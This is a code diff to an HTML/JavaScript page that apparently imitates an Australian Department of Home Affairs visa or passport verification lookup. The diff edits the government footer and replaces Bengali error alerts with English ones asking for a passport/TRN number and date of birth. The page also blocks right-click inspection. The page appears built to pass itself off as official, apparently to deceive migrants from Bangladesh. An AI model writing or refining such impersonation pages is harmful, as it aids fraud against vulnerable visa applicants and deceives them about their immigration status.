@@ -132,7 +132,8 @@
      oncontextmenu="return false;">
 
 <div class="footer">
-    © Australian Government — Department of Home Affairs
+    © Australian Government — Welcome to the Department of Home Affairs
+Immigration and citizenship
 </div>
 
 <script>
@@ -160,7 +161,7 @@
         const dobInput = document.getElementById('dob').value;
 
         if (!docNum || !dobInput) {
-            alert("অনুগ্রহ করে, Transaction (TRN), ও আপনার পাসপোর্ট নাম্বার এবং জন্ম তারিখ সঠিকভাবে প্রদান করুন। অন্যথায় আমরা ভেরিফিকেশন করতে পারছিনা।");
+            alert("Please provide your passport/document (TRN) number and date of birth correctly. Otherwise please check your Australian immiAccount Application, details and Try again!");
             return;
         }
 
@@ -211,7 +212,7 @@
                 startAutoHomeTimer();
 
             } else {
-                alert("ভুল তথ্য! আপনার প্রদানকৃত পাসপোর্ট নাম্বারটি ডাটাবেজে খুঁজে পাওয়া যায়নি।");
+                alert("Your information is incorrect! au Govt, information not found? Provide Passport / Document (TRN) Number!");
                 document.getElementById('searchForm').style.display = 'block';
             }
         }).catch(err => {
